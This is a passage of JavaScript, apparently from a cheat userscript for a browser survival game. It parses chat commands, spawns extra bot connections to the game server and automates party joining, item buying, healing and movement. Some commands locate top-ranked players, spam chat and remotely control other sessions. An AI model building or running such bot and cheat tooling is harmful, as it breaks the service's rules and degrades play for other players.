                    user.sendMessage("eua");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + prefix + "ua") {
                if (user.connectedToId) {
                    user.sendMessage("dua");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + "sa") {
                if (user.connectedToId) {
                    user.sendMessage("esa");
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + prefix + "sa") {
                if (user.connectedToId) {
                    user.sendMessage("dsa");
                    user.sendMessage("getsettings");
                }
            }
            if (msg.startsWith(`${prefix}sbtpos`)) {
                user.connectedToId && user.sendMessage("sbtpos");
            }
            if (msg.startsWith(`${prefix}sbt `)) {
                let args = msg.split(`${prefix}sbt `);
                let sbtStartTick = args[1].split(" ")[0];
                let sbtEndTick = args[1].split(" ")[1];
                user.connectedToId && user.sendMessage(`esbt,  ;${sbtStartTick},  ;${sbtEndTick}`);
            }
            if (msg == prefix + prefix + "sbt") {
                user.connectedToId && user.sendMessage("dsbt");
            }
            if (msg.startsWith(`${prefix}mpt `)) {
                let args = msg.split(`${prefix}mpt `);
                let psk1 = args[1].split(" ")[0];
                let psk2 = args[1].split(" ")[1];
                let psk3 = args[1].split(" ")[2];
                let psk4 = args[1].split(" ")[3];
                user.connectedToId && user.sendMessage(`empt,  ;${psk1},  ;${psk2},  ;${psk3},  ;${psk4}`);
            }
            if (msg == prefix + prefix + "mpt") {
                user.connectedToId && user.sendMessage("dmpt");
            }
            if (msg.startsWith(`${prefix}hth `)) {
                let args = msg.split(`${prefix}hth `);
                if (user.connectedToId) {
                    user.sendMessage(`ehth,  ;${args[1]}`);
                    user.sendMessage("getsettings");
                }
            }
            if (msg == prefix + prefix + "hth") {
                if (user.connectedToId) {
                    user.sendMessage("dhth");
                    user.sendMessage("getsettings");
                }
            }
            if (msg.startsWith(`${prefix}shs `)) {
                let args = msg.split(`${prefix}shs `);
                user.connectedToId && user.sendMessage(`hs,  ;${args[1]}`);
            }
            if (msg.startsWith(`${prefix}sphs `)) {
                let args = msg.split(`${prefix}sphs `);
                user.connectedToId && user.sendMessage(`phs,  ;${args[1]}`);
            }
            if (msg.startsWith(`${prefix}sah `)) {
                user.connectedToId && user.sendMessage(`eah`);
            }
            if (msg.startsWith(`${prefix}${prefix}sah `)) {
                user.connectedToId && user.sendMessage(`dah`);
            }
            if (msg.startsWith(`${prefix}sar `)) {
                user.connectedToId && user.sendMessage(`earn`);
            }
            if (msg.startsWith(`${prefix}${prefix}sar `)) {
                user.connectedToId && user.sendMessage(`darn`);
            }
            if (msg == prefix + "mb") {
                if (user.connectedToId) {
                    setTimeout(() => {
                        Object.keys(allSessions).find(session => allSessions[session].uid == window.sessionUid && user.sendMessage(`uncontrolsession,  ;${session}`));
                    }, 1000);
                    user.sendMessage("emb");
                }
            }
            if (msg == prefix + prefix + "mb") {
                if (user.connectedToId) {
                    user.sendMessage("dmb");
                    setTimeout(() => {
                        Object.values(document.getElementsByClassName("hud-map-player")).forEach(e => {
                            e.dataset.index === "6" && e.remove();
                        });
                    }, 1000);
                }
            }
            if (msg.startsWith(`${prefix}ja `)) {
                let args = msg.split(`${prefix}ja `);
                if (args[1].length == 20) {
                    game.network.sendPacket(9, {name: "JoinPartyByShareKey", partyShareKey: args[1]});
                } else {
                    if (sockets[args[1]]) {
                        game.network.sendPacket(9, {name: "JoinPartyByShareKey", partyShareKey: sockets[args[1]].psk.response.partyShareKey});
                    }
                }
                user.connectedToId && user.sendMessage(`joinses,  ;${args[1]}`);
            }
            if (msg.startsWith(`${prefix}altjoin `)) {
                let args = msg.split(`${prefix}altjoin `);
                let socket1 = args[1].split(" ")[0];
                let socket2 = args[1].split(" ")[1];
                if (sockets[socket1]) {
                    if (sockets[socket1].activeBuildingsByPos.size) {
                        game.ui.getComponent("PopupOverlay").showConfirmation(`Are you sure you want to add ${socket1} in your party?`, 1e4, function() {
                            sockets[socket2] ? sockets[socket1].sendPacket(9, {name: "JoinPartyByShareKey", partyShareKey: sockets[socket2].psk.response.partyShareKey}) : sockets[socket1].sendPacket(9, {name: "JoinPartyByShareKey", partyShareKey: game.ui.playerPartyShareKey});
                        })
                    } else {
                        sockets[socket2] ? sockets[socket1].sendPacket(9, {name: "JoinPartyByShareKey", partyShareKey: sockets[socket2].psk.response.partyShareKey}) : sockets[socket1].sendPacket(9, {name: "JoinPartyByShareKey", partyShareKey: game.ui.playerPartyShareKey});
                    }
                }
                if (user.connectedToId) {
                    if (allSessions[socket1]) {
                        if (allSessions[socket1].gs) {
                            game.ui.getComponent("PopupOverlay").showConfirmation(`Are you sure you want to add ${socket1} in your party?`, 1e4, function() {
                                allSessions[socket2] ? user.sendMessage(`sesjoin,  ;${socket1},  ;${socket2}`) : user.sendMessage(`sesjoin,  ;${socket1},  ;0`);
                            });
                        } else {
                            allSessions[socket2] ? user.sendMessage(`sesjoin,  ;${socket1},  ;${socket2}`) : user.sendMessage(`sesjoin,  ;${socket1},  ;0`);
                        }
                    }
                }
            }
            if (msg.startsWith(`${prefix}ja`)) {
                Object.keys(sockets).forEach(i => {
                    if (!sockets[i].gs) {
                        game.network.sendPacket(9, {name: "JoinPartyByShareKey", partyShareKey: sockets[i].psk.response.partyShareKey});
                    }
                })
            }
            if (msg.startsWith(`${prefix}js`)) {
                user.connectedToId && user.sendMessage(`js`);
            }
            if (msg == prefix + "saj") {
                user.connectedToId && user.sendMessage("eaaj");
            }
            if (msg == prefix + prefix + "saj") {
                user.connectedToId && user.sendMessage("daaj");
            }
            if (msg.startsWith(`${prefix}sasp `)) {
                let args = msg.split(`${prefix}sasp `);
                user.connectedToId && user.sendMessage(`eas,  ;${args[1]}`);
            }
            if (msg == prefix + prefix + "sasp") {
                user.connectedToId && user.sendMessage("das");
            }
            if (msg == prefix + "sxk") {
                user.connectedToId && user.sendMessage("exk");
            }
            if (msg == prefix + prefix + "sxk") {
                user.connectedToId && user.sendMessage("dxk");
            }
            if (msg == prefix + "ssp") {
                user.connectedToId && user.sendMessage("ecs");
            }
            if (msg == prefix + prefix + "ssp") {
                user.connectedToId && user.sendMessage("dcs");
            }
            if (msg.startsWith(`${prefix}pf `)) {
                let args = msg.split(`${prefix}pf `);
                sessionPlayerFinderRank = args[1] - 1;
                user.connectedToId && user.sendMessage(`epf,  ;${game.ui.components.Leaderboard.leaderboardData[sessionPlayerFinderRank].uid}`);
            }
            if (msg == prefix + prefix + "pf") {
                user.connectedToId && user.sendMessage("dpf");
            }
            if (msg.startsWith(`${prefix}cs `)) {
                let args = msg.split(`${prefix}cs `);
                user.connectedToId && user.sendMessage(`controlsession,  ;${args[1]}`);
            }
            if (msg.startsWith(`${prefix}us `)) {
                let args = msg.split(`${prefix}us `);
                user.connectedToId && user.sendMessage(`uncontrolsession,  ;${args[1]}`);
            }
            if (msg.startsWith(`${prefix}ls `)) {
                let args = msg.split(`${prefix}ls `);
                user.connectedToId && user.sendMessage(`locksession,  ;${args[1]}`);
            }
            if (msg.startsWith(`${prefix}${prefix}ls `)) {
                let args = msg.split(`${prefix}${prefix}ls `);
                user.connectedToId && user.sendMessage(`unlocksession,  ;${args[1]}`);
            }
            if (msg.startsWith(`${prefix}leave `)) {
                let args = msg.split(`${prefix}leave `);
                sockets[args[1]].sendPacket(9, {name: "LeaveParty"});
                user.connectedToId && user.sendMessage(`leaveses,  ;${args[1]}`);
            }
            if (msg.startsWith(`${prefix}l `)) {
                let args = msg.split(`${prefix}l `);
                let socket = args[1].split(" ")[0];
                if (sockets[socket]) {
                    sockets[socket].isLocked = true;
                }
            }
            if (msg.startsWith(`${prefix}${prefix}l `)) {
                let args = msg.split(`${prefix}${prefix}l `);
                let socket = args[1].split(" ")[0];
                if (sockets[socket]) {
                    sockets[socket].isLocked = false;
                }
            }
            if (msg.startsWith(prefix + "pop")) {
                game.ui.components.PopupOverlay.showHint(`${this.script.players} players, ${Object.keys(sockets).length} sockets, ${Object.keys(window.allSessions).length} sessions, ${Object.keys(window.allSessions).length > 0 ? Object.keys(sockets).length + Object.keys(window.allSessions).length : Object.keys(sockets).length + 1} slots`);
            }
            if (msg == prefix + "scl") {
                this.script.scripts.scorelogger = true;
            }
            if (msg == prefix + prefix + "scl") {
                this.script.scripts.scorelogger = false;
            }
            if (msg.startsWith(prefix + "send ")) {
                let amt = parseInt(msg.split(" ")[1]);
                let delay = ms => new Promise(resolve => setTimeout(resolve, ms));
                (async () => {
                    for (let i = 0; i < amt; i++) {
                        new Alt(1); // Pass an argument to the Alt constructor
                        await delay(2000);
                    }
                })();
            }
            if (msg == prefix + "p") {
                let a = Object.values(sockets);
                sockets = {};
                let b16;
                for (let i = 0; i < a.length; i++) {
                    a[i].id = i + 1;
                    sockets[i + 1] = a[i];
                }
                b16 = a.length;
                game.ui.components.Map.onPartyMembersUpdate(script.partyInfoAlt);
            }
            if (msg.startsWith(prefix + "close ")) {
                let amt = msg.split(" ")[1] - "";
                if (sockets[amt]) {
                    sockets[amt].ws.send([]);
                }
            }
            if (msg == prefix + "reset") {
                Object.values(sockets).forEach(bot => {
                    bot.ws.send([]);
                });
            }
            if (msg == prefix + "s") {
                for (let i in sockets) {
                    game.ui.components.Chat.onMessageReceived({displayName: `${sockets[i].id}`, message: `W: ${counter(sockets[i].myPlayer.wood)}, S: ${counter(sockets[i].myPlayer.stone)}, G: ${counter(sockets[i].myPlayer.gold)}, T: ${counter(sockets[i].myPlayer.token)}, P: ${sockets[i].myPlayer.partyId}, W: ${counter(sockets[i].myPlayer.wave)};`});
                }
            }
            if (msg == prefix + "ps") {
                game.ui.playerPartyMembers.forEach(e => {
                    game.ui.components.Chat.onMessageReceived({displayName: `${game.world.entities.get(e.playerUid).targetTick.name}`, message: `W: ${counter(game.world.entities.get(e.playerUid).targetTick.wood)}, S: ${counter(game.world.entities.get(e.playerUid).targetTick.stone)}, G: ${counter(game.world.entities.get(e.playerUid).targetTick.gold)}, T: ${counter(game.world.entities.get(e.playerUid).targetTick.token)};`});
                });
            }
            if (msg == prefix + "ss") {
                for (let i in allSessions) {
                    allSessions[i].uid !== window.sessionUid && game.ui.components.Chat.onMessageReceived({displayName: `${i}`, message: `W: ${counter(allSessions[i].wood)}, S: ${counter(allSessions[i].stone)}, G: ${counter(allSessions[i].gold)}, T: ${counter(allSessions[i].token)}, P: ${allSessions[i].partyId}, W: ${counter(allSessions[i].wave)};`});
                }
            }
            if (msg == prefix + "as" || msg == prefix + "as1") {
                autotier1spear = true;
                autotier2spear = false;
                autotier3spear = false;
                autotier4spear = false;
                autotier5spear = false;
                autotier6spear = false;
                autotier7spear = false;
            }
            if (msg == prefix + "as2") {
                autotier1spear = false;
                autotier2spear = true;
                autotier3spear = false;
                autotier4spear = false;
                autotier5spear = false;
                autotier6spear = false;
                autotier7spear = false;
            }
            if (msg == prefix + "as3") {
                autotier1spear = false;
                autotier2spear = false;
                autotier3spear = true;
                autotier4spear = false;
                autotier5spear = false;
                autotier6spear = false;
                autotier7spear = false;
            }
            if (msg == prefix + "as4") {
                autotier1spear = false;
                autotier2spear = false;
                autotier3spear = false;
                autotier4spear = true;
                autotier5spear = false;
                autotier6spear = false;
                autotier7spear = false;
            }
            if (msg == prefix + "as5") {
                autotier1spear = false;
                autotier2spear = false;
                autotier3spear = false;
                autotier4spear = false;
                autotier5spear = true;
                autotier6spear = false;
                autotier7spear = false;
            }
            if (msg == prefix + "as6") {
                autotier1spear = false;
                autotier2spear = false;
                autotier3spear = false;
                autotier4spear = false;
                autotier5spear = false;
                autotier6spear = true;
                autotier7spear = false;
            }
            if (msg == prefix + "as7") {
                autotier1spear = false;
                autotier2spear = false;
                autotier3spear = false;
                autotier4spear = false;
                autotier5spear = false;
                autotier6spear = false;
                autotier7spear = true;
            }
            if (msg == prefix + prefix + "as") {
                autotier1spear = false;
                autotier2spear = false;
                autotier3spear = false;
                autotier4spear = false;
                autotier5spear = false;
                autotier6spear = false;
                autotier7spear = false;
            }
            if (msg == prefix + "aja") {
                script.scripts.autoaltjoin = true;
            }
            if (msg == prefix + prefix + "aja") {
                script.scripts.autoaltjoin = false;
            }
            if (msg.startsWith(prefix + "findtop ") || msg.startsWith(prefix + "ft ")) {
                let rank = parseInt(msg.split(" ")[1]) - 1;
                let uid = game.ui.components.Leaderboard.leaderboardData[rank] ? game.ui.components.Leaderboard.leaderboardData[rank].uid : game.ui.components.Leaderboard.leaderboardData[0].uid;
                ft = true;
            
                if (!window.interval_1) {
                    interval_1 = setInterval(() => {
                        if (ft) {
                            for (let i in sockets) {
                                let player = sockets[i].entities.get(uid);
                                if (player) {
                                    console.log(player.targetTick);
                                    game.ui.components.Chat.onMessageReceived({
                                        displayName: "PlayerFinder",
                                        message: (rank + 1) + " found, position: {x: " + player.targetTick.position.x + ", y: " + player.targetTick.position.y + "}"
                                    });
                                    clearInterval(interval_1);
                                    interval_1 = undefined;
                                }
                            }
                        }
                    }, 50);
                }
            
                // Make the sockets move around in random directions
                Object.keys(sockets).forEach((ii) => {
                    let socket = sockets[ii];
                    let directions = ["up", "down", "left", "right"];
            
                    function getRandomDirection(lastDirection) {
                        let oppositeDirection = {
                            "up": "down",
                            "down": "up",
                            "left": "right",
                            "right": "left"
                        };
                        let availableDirections = directions.filter(dir => dir !== oppositeDirection[lastDirection]);
                        return availableDirections[Math.floor(Math.random() * availableDirections.length)];
                    }
            
                    function moveRandomly(socket, lastDirection) {
                        if (!ft) return; // Stop moving if ft is false
            
                        let direction = getRandomDirection(lastDirection);
                        let interval = setInterval(() => {
                            if (!ft) {
                                clearInterval(interval);
                                return;
                            }
            
                            let moveDirection = {
                                up: direction === "up" ? 1 : 0,
                                down: direction === "down" ? 1 : 0,
                                left: direction === "left" ? 1 : 0,
                                right: direction === "right" ? 1 : 0
                            };
                            socket.sendPacket(3, moveDirection);
                        }, 100);
            
                        setTimeout(() => {
                            clearInterval(interval);
                            moveRandomly(socket, direction);
                        }, 3000); // Change direction every 3 seconds
                    }
            
                    moveRandomly(socket, null);
                });
            }
            if (msg == prefix + prefix + "ft" || msg == prefix + prefix + "findtop") {
                ft = false;
                clearInterval(window.interval_1);
                interval_1 = undefined;
            }
            if (msg == prefix + "sp") {
                script.scripts.messagespam = true;
            }
            if (msg == prefix + prefix + "sp") {
                script.scripts.messagespam = false;
            }
            return;
        } else {
            game.network.sendRpc2(e);
        }
    }
    game.network.sendRpc2(e);
}

class Alt {
    constructor(amt) {
        let thisServer = game.options.servers[game.options.serverId];
        this.ws = new WebSocket(`wss://${thisServer.host}:${443}/`);
        this.bot = {ws: this.ws};
        let id;
        this.ws.binaryType = "arraybuffer";
        let network = new game.networkType();
        network.emitter.removeListener("PACKET_BLEND", network.emitter._events.PACKET_BLEND);
        this.bot.uidType = game.world.myUid;
        this.bot.network = network;
        let codec = new BinCodec();
        this.bot.sendPacket = (event, data) => this.ws.readyState == 1 && this.ws.send(codec.encode(event, data));
        network.sendPing = () => this.ws.send(new Uint8Array([7, 0]));
        this.bot.world = {};
        this.bot.activeBuildingsByPos = new Map();
        this.bot.buildings = {};
        this.bot.harvesters = {};
        this.bot.inventory = {};
        this.bot.entities = new Map();
        this.bot.myPlayer = {};
        this.bot.myPet = {};
        this.bot.buildingUids_1 = {};
        this.bot.mouse = {};
        this.bot.stashPs = {};
        this.bot.isLocked = false;
        this.bot.oldPsk = "";
        this.bot.lpa = false;
        this.bot.autoTimeout = false;
        this.bot.hasLeft = false;
        this.bot.playerX = -1;
        this.bot.playerY = -1;
        this.bot.yaw = 0;
        this.bot.s = {};
        this.bot.scripts = script.scripts;
        this.bot.scripts.me = 1;
        this.bot.rounds = 999999999999999;
        this.bot.yaws = [];
        for (let i = 0; i < 360; i++) {
            this.bot.yaws.push(i);
        }
        this.bot.a77 = null;
        this.bot.a77r = null;
        this.bot.a76 = null;
        this.ws.onopen = () => {
            this.ws.onmessage = (msg) => {
                switch (new Uint8Array(msg.data)[0]) {
                    case 5:
                        var This = this;
                        createModule(game.network.connectionOptions.hostname).then(e => {
                            let wasmmodule = e;
                            let extra = codec.decode(new Uint8Array(msg.data), wasmmodule).extra;
                            if (new Uint8Array(extra)[0] == 0 && new Uint8Array(extra)[1] == 0 && new Uint8Array(extra)[2] == 0) {
                                new Alt(amt);
                            } else {
                                This.bot.sendPacket(4, { displayName: altName, extra: extra });
                                This.bot.enterworld2 = codec.encode(6, {}, wasmmodule);
                                This.bot.module = wasmmodule;
                                amt > 1 && new Alt(--amt);
                            }
                        });
                        return;
                    case 10:
                        this.bot.sendPacket(10, { extra: codec.decode(new Uint8Array(msg.data), this.bot.module).extra });
                        return;
                }
                let data = codec.decode(msg.data);
                if (this.bot.sendPacket + "" == "() => {}") {
                    switch (data.opcode) {
                        case 9:
                            this.rpcs(data);
                            break;
                    }
                }
                if (!(this.bot.sendPacket + "" == "() => {}")) {
                    switch (data.opcode) {
                        case 4:
                            if (data.allowed) {
                                count = count + 1;
                                this.bot.id = count;
                                this.bot.enterworld2 && this.ws.send(this.bot.enterworld2);
                            }
                            this.onEnterWorld(data);
                            break;
                        case 9:
                            this.rpcs(data);
                            break;
                        case 0:
                            this.entitiesUpdater(data.entities);
                            if (!(this.bot.id in sockets)) {
                                sockets[this.bot.id] = this.bot;
                                socketsByUid[this.bot.uid] = this.bot;
                            };
                            break;
                    }
                }
            }
            this.ws.onclose = () => {
                delete sockets[this.bot.id];
                delete socketsByUid[this.bot.uid];
                if (this.bot.world.allowed) {
                    game.ui.components.PopupOverlay.showHint(`${--script.players} players, ${Object.keys(sockets).length} sockets, ${Object.keys(window.allSessions).length} sessions, ${Object.keys(window.allSessions).length > 0 ? Object.keys(sockets).length + Object.keys(window.allSessions).length : Object.keys(sockets).length + 1} slots`);
                    script.scripts.autoreconnect && new Alt(1);
                }
            }
        }
    }
    rpcs = (data) => {
        if (data.name == "LocalBuilding") {
            data.response.forEach(e => {
                if (this.bot.buildingUids_1[e.uid]) {
                    return;
                }
                if (e.dead && !this.bot.buildingUids_1[e.uid]) {
                    this.bot.buildingUids_1[e.uid] = 1;
                    setTimeout(() => {
                        delete this.bot.buildingUids_1[e.uid];
                    }, 500)
                }
                if (e.type == "GoldStash") {
                    this.bot.gs = e;
                }
                if (e.type == "GoldStash" && e.dead) {
                    this.bot.gs = undefined;
                }
                let index = getEntitiesInGrid(e.x, e.y);
                this.bot.activeBuildingsByPos.set(index, e);
                if (this.bot.activeBuildingsByPos.get(index).dead) this.bot.activeBuildingsByPos.delete(index);
                e.type == "Harvester" && (this.bot.harvesters[index] = e);
            })
        }
        if (data.name == "PartyShareKey") {
            this.bot.psk = data;
        }
        if (data.name == "Dead") {
            this.bot.thisWeapon = "Pickaxe";
            this.bot.sendPacket(9, {name: "BuyItem", itemName: "HatHorns", tier: 1});
            if (script.scripts.socketFollowMouse && !script.scripts.wasd) {
                this.bot.reversedYaw = true;
                setTimeout(() => {
                    this.bot.reversedYaw = false;
                }, 500)
            }
        }
        if (data.name == "SetItem") {
            this.bot.inventory[data.response.itemName] = data.response;
            if (this.bot.inventory.HatHorns) {
                if (!this.bot.inventory.HatHorns.stacks) {
                    this.bot.sendPacket(9, {name: "BuyItem", itemName: "HatHorns", tier: 1});
                }
            }
            if (!this.bot.inventory[data.response.itemName].stacks) {
                delete this.bot.inventory[data.response.itemName];
            }
            if (data.response.itemName == "ZombieShield" && data.response.stacks) {
                this.bot.sendPacket(9, {name: "EquipItem", itemName: "ZombieShield", tier: data.response.tier})
            }
        }
        if (data.name == "PartyInfo") {
            let response = data.response;
            if (response[0].playerUid == this.bot.uid) {
                response.forEach(e => {
                    if ((e.playerUid == game.world.myUid || socketsByUid[e.playerUid]) && !e.canSell) {
                        this.bot.sendPacket(9, {name: "SetPartyMemberCanSell", uid: e.playerUid, canSell: 1});
                    }
                })
            }
        }
    }
    onEnterWorld = (data) => {
        this.bot.world = {players: data.players, allowed: data.allowed};
        script.players = data.players;
        script.oldPlayers = script.players;
        game.ui.components.PopupOverlay.showHint(`${script.players} players, ${Object.keys(sockets).length + 1} sockets, ${Object.keys(window.allSessions).length} sessions, ${Object.keys(window.allSessions).length > 0 ? Object.keys(sockets).length + Object.keys(window.allSessions).length : Object.keys(sockets).length + 2} slots`);
        this.bot.myPlayer.uid = data.uid;
        this.bot.myPlayer.position = {x: 0, y: 0}
        this.bot.uid = data.uid;
        this.bot.join = (psk) => {
            this.bot.sendPacket(9, {name: "JoinPartyByShareKey", partyShareKey: psk + ""});
        }
        this.bot.leave = () => {
            this.bot.sendPacket(9, {name: "LeaveParty"});
        }
        this.bot.buy = (e, t) => {
            this.bot.sendPacket(9, {name: "BuyItem", itemName: e, tier: t});
        }
        this.bot.equip = (e, t) => {
            this.bot.sendPacket(9, {name: "EquipItem", itemName: e, tier: t});
        }
        this.bot.kick = (uid) => {
            this.bot.sendPacket(9, {name: "KickParty", uid: uid});
        }
        this.bot.timeout = () => {
            this.bot.buy("Pause", 1);
        }
        if (data.allowed) {
            sockets[this.bot.id] = this.bot;
            socketsByUid[this.bot.uid] = this.bot;
            this.bot.id = this.bot.id;
            this.bot.sendPacket(9, {name: "JoinPartyByShareKey", partyShareKey: game.ui.playerPartyShareKey});
            this.bot.sendPacket(9, {name: "BuyItem", itemName: "HatHorns", tier: 1});
            this.bot.sendPacket(9, {name: "BuyItem", itemName: "PetCARL", tier: 1});
            this.bot.sendPacket(9, {name: "EquipItem", itemName: "PetCARL", tier: 1});
            this.bot.sendPacket(9, {name: "BuyItem", itemName: "PetMiner", tier: 1});
            this.bot.sendPacket(3, {space: 1});
            this.bot.sendPacket(3, {up: 1});
            typeof partyInfo !== "undefined" && game.ui.components.Map.onPartyMembersUpdate(partyInfo);
            game.ui.components.Map.onPartyMembersUpdate(this.partyInfoAlt);
        }
    }
    depositAhrc = (tick) => {
        Object.values(this.bot.harvesters).forEach(e => {
            if (e.tier == tick.tier) {
                this.bot.sendPacket(9, {name: "AddDepositToHarvester", uid: e.uid, deposit: tick.deposit})
            }
        })
    }
    collectAhrc = (tick) => {
        Object.values(this.bot.harvesters).forEach(e => {
            if (e.tier == tick.tier) {
                this.bot.sendPacket(9, {name: "CollectHarvester", uid: e.uid})
            }
        })
    }
    mover = function(e, type = "name", uid = this.bot.uidType) {
        let isActive = e.get(uid);
        if (isActive) {
            yaw = isActive.yaw;
            this.bot.playerX = isActive.position.x;
            this.bot.playerY = isActive.position.y;
        } else if (scripts.me) {
            yaw = myPlayer.yyaw;
            this.bot.playerX = myPlayer.position.x;
            this.bot.playerY = myPlayer.position.y;
        }
        this.bot.s.playerX = this.bot.playerX;
        this.bot.s.playerY = this.bot.playerY;

        const directionMap = {
            90: { right: 1, left: 0, up: 0, down: 0 },
            225: { down: 1, left: 1, up: 0, right: 0 },
            44: { down: 0, left: 0, up: 1, right: 1 },
            314: { down: 0, left: 1, up: 1, right: 0 },
            135: { down: 1, left: 0, up: 0, right: 1 },
            359: { up: 1, down: 0, right: 0, left: 0 },
            180: { down: 1, up: 0, right: 0, left: 0 },
            270: { left: 1, right: 0, up: 0, down: 0 }
        };

        if (yaw) {
            this.bot.s.isYaw = true;
            this.bot.sendPacket(3, directionMap[yaw] || {});
        } else if (this.bot.s.isYaw) {
            this.bot.s.isYaw = false;
            this.bot.sendPacket(3, { right: 0, left: 0, up: 0, down: 0 });
        }

        if (this.bot.myPlayer.position) {
            if (this.bot.aiming) {
                let yaw = angleTo(this.bot.myPlayer.position.x, this.bot.myPlayer.position.y, this.bot.s.playerX, this.bot.s.playerY);
                this.bot.sendPacket(3, { mouseDown: yaw });
                if (this.bot.myPlayer.uid == game.world.myUid) {
                    game.inputPacketCreator.lastAnyYaw = yaw;
                }
            }

            const distance = Math.sqrt(Math.pow((this.bot.myPlayer.position.y - this.bot.s.playerY), 2) + Math.pow((this.bot.myPlayer.position.x - this.bot.s.playerX), 2));
            if (distance < 100) {
                this.bot.s.stopped = true;
            } else {
                this.bot.s.stopped = false;
                if (!yaw) {
                    if (this.bot.myPlayer.position.y - this.bot.s.playerY > 100) {
                        this.bot.sendPacket(3, { down: 1 });
                    } else if (-this.bot.myPlayer.position.y + this.bot.s.playerY > 100) {
                        this.bot.sendPacket(3, { up: 1, down: 0 });
                    } else if (-this.bot.myPlayer.position.x + this.bot.s.playerX > 100) {
                        this.bot.sendPacket(3, { left: 1 });
                    } else if (this.bot.myPlayer.position.x - this.bot.s.playerX > 100) {
                        this.bot.sendPacket(3, { right: 1 });
                    }
                }
            }
        }
    }
    moverbymouse = function(data, type = "name", pos, isMouseMoving = true, isPlayerMoving) {
        this.bot.playerX = this.bot.mouse.x;
        this.bot.playerY = this.bot.mouse.y;
        this.bot.s.playerX = this.bot.playerX;
        this.bot.s.playerY = this.bot.playerY;
        let aimingYaw1 = angleTo(this.bot.myPlayer.position.x, this.bot.myPlayer.position.y, this.bot.s.playerX, this.bot.s.playerY);
        if (isMouseMoving || isPlayerMoving) {
            yaw = aimToYaw(aimingYaw1);
        } else {
            yaw = null;
        }
        if (yaw) {
            const directions = {
                90: { right: 1, left: 0, up: 0, down: 0 },
                225: { down: 1, left: 1, up: 0, right: 0 },
                44: { down: 0, left: 0, up: 1, right: 1 },
                314: { down: 0, left: 1, up: 1, right: 0 },
                135: { down: 1, left: 0, up: 0, right: 1 },
                359: { up: 1, down: 0, right: 0, left: 0 },
                180: { down: 1, up: 0, right: 0, left: 0 },
                270: { left: 1, right: 0, up: 0, down: 0 }
            };
            const reversedDirections = {
                90: { left: 1, right: 0, up: 0, down: 0 },
                225: { down: 0, left: 0, up: 1, right: 1 },
                44: { down: 1, left: 1, up: 0, right: 0 },
                314: { down: 1, left: 0, up: 0, right: 1 },
                135: { down: 0, left: 1, up: 1, right: 0 },
                359: { up: 0, down: 1, right: 0, left: 0 },
                180: { down: 0, up: 1, right: 0, left: 0 },
                270: { left: 0, right: 1, up: 0, down: 0 }
            };
            const direction = reversedYaw || this.bot.reversedYaw ? reversedDirections[yaw] : directions[yaw];
            if (direction) {
                this.bot.sendPacket(3, direction);
            }
        }
    }
    moverbyrounds = function(data, type = "name", pos, isMouseMoving = true, isPlayerMoving) {
        let pos17 = RoundPlayer(this.bot.rounds);
        this.bot.playerX = pos17.x;
        this.bot.playerY = pos17.y;
        this.bot.s.playerX = this.bot.playerX;
        this.bot.s.playerY = this.bot.playerY;
        let aimingYaw1 = angleTo(this.bot.myPlayer.position.x, this.bot.myPlayer.position.y, pos17.x, pos17.y);
        if (isMouseMoving || isPlayerMoving) {
            yaw = aimToYaw(aimingYaw1);
        } else {
            yaw = null;
        }
        if (yaw && this.bot.a76 !== yaw) {
            this.bot.a76 = yaw;
            const directionMap = {
                90: { right: 1, left: 0, up: 0, down: 0 },
                225: { down: 1, left: 1, up: 0, right: 0 },
                44: { down: 0, left: 0, up: 1, right: 1 },
                314: { down: 0, left: 1, up: 1, right: 0 },
                135: { down: 1, left: 0, up: 0, right: 1 },
                359: { up: 1, down: 0, right: 0, left: 0 },
                180: { down: 1, up: 0, right: 0, left: 0 },
                270: { left: 1, right: 0, up: 0, down: 0 }
            };
            this.bot.sendPacket(3, directionMap[yaw]);
        }
        if (this.bot.myPlayer.position) {
            if (Math.sqrt(Math.pow((this.bot.myPlayer.position.y - this.bot.s.playerY), 2) + Math.pow((this.bot.myPlayer.position.x - this.bot.s.playerX), 2)) < 135) {
                this.bot.rounds += reversedYaw ? 1 : -1;
            }
        }
    }
    entitiesUpdater(e) {
        script.scripts.autoheal.autobuypotion && !script.scripts.xkey && this.bot.sendPacket(9, {name: "BuyItem", itemName: "HealthPotion", tier: 1});
        (script.scripts.autorespawn || script.scripts.xkey) && this.bot.sendPacket(3, {respawn: 1});
        e.forEach(e1 => {
            if (e1.model == "GamePlayer" || ((e1.model == "PetCARL" || e1.model == "PetMiner") && (e1.uid == e.get(this.bot.myPlayer.uid).petUid))) {
                if (this.bot.entities.get(e1.uid) == undefined) this.bot.entities.set(e1.uid, {uid: e1.uid, entityClass: e1.entityClass, model: e1.model, targetTick: e1});
            }
            let e2 = this.bot.entities.get(e1.uid);
            if (e2) {
                addMissingTickFields(e2.targetTick, e1);
            }
        })
        let targets = [];
        const myPos = this.bot.myPlayer.position;
        this.bot.entities.forEach(e2 => {
            let t = e2.targetTick;
            if (t.model && t.uid !== this.bot.myPlayer.uid) {
                targets.push(t);
            }
            if (!e.get(t.uid)) {
                this.bot.entities.delete(t.uid);
            }
        })
        let player = this.bot.entities.get(this.bot.myPlayer.uid);
        let _player = e.get(this.bot.myPlayer.uid);
        if (player) {
            if (_player) {
                if (this.bot.myPlayer.position) {
                    this.bot.aimingYaw = script.scripts.mousePositionToggle ? angleTo(this.bot.myPlayer.position.x, this.bot.myPlayer.position.y, this.bot.mouse.x, this.bot.mouse.y) : angleTo(this.bot.myPlayer.position.x, this.bot.myPlayer.position.y, this.bot.stashPs.x, this.bot.stashPs.y);
                    !this.bot.aiming && !spinning && this.bot.sendPacket(3, {mouseMoved: this.bot.aimingYaw});
                }
                if (_player.uid) {
                    this.bot.myPlayer = this.bot.entities.get(this.bot.myPlayer.uid).targetTick;
                    if ((this.bot.myPlayer.health/this.bot.myPlayer.maxHealth) * 100 < script.scripts.autoheal.healSet && (this.bot.myPlayer.health/this.bot.myPlayer.maxHealth) * 100 > 0) {
                        if (script.scripts.autoheal.enabled) {
                            if (!this.bot.healPlayer) {
                                this.bot.sendPacket(9, {name: "EquipItem", itemName: "HealthPotion", tier: 1})
                                this.bot.sendPacket(9, {name: "BuyItem", itemName: "HealthPotion", tier: 1})
                                this.bot.healPlayer = true;
                                setTimeout(() => {
                                    this.bot.healPlayer = false;
                                }, 500);
                            }
                        }
                    }
                }
            }
        }
        if (this.bot.myPlayer.petUid) {
            this.bot.petActivated = true;
            if (_player && _player.uid) {
                let pet = this.bot.entities.get(this.bot.myPlayer.petUid);
